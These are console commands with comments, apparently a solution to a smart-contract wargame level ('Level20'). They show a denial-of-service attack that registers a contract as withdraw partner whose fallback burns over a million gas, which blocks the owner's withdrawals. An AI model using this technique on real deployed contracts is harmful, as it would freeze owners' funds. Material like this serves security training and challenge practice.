//goal is to stop owner from withdrawind funds while contract has funds and gas is <= 1 mill

//confirm contract has funds 
await getBalance(contract.address)

//deploy a contract Level20 which uses more than 1 mill gas in the fallback function


//then make the contract a partner
let level20 = "0x28D2199b6c9ac5216402dE27c05C9683c5B63F06";
await contract.setWithdrawPartner(level20)

//verify contract is now partner
await contract.partner()

//submit solution